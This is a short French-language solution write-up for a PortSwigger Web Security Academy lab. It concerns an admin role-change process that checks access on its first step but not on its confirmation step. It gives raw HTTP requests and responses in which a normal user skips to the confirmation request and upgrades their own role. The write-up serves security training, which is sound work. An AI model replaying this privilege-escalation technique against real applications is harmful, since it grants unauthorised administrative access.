# Lab

https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

## Solution

Ce lab possède un panel d'amin permettant de gérer les rôles des utilisateurs.

Quand on veut changer le rôle d'un utilisateur, il y a deux étapes :

1. Sélectionner l'utilisateur
2. Valider le changement de rôle

La première étape est protégée par un contrôle d'accès, mais pas la deuxième.

### Séléctionner l'utilisateur

```http
POST /admin-roles HTTP/2
Host: 0a4000fd0423a588813017ba00830083.web-security-academy.net
Cookie: session=9urCNOo4mf4b15wY2NGicFal8z9XDMKt
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://0a4000fd0423a588813017ba00830083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a4000fd0423a588813017ba00830083.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

username=wiener&action=upgrade
```

```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

### Valider le changement de rôle

```http
POST /admin-roles HTTP/2
Host: 0a4000fd0423a588813017ba00830083.web-security-academy.net
Cookie: session=9urCNOo4mf4b15wY2NGicFal8z9XDMKt
Content-Length: 45
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://0a4000fd0423a588813017ba00830083.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a4000fd0423a588813017ba00830083.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

action=upgrade&confirmed=true&username=wiener
```

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```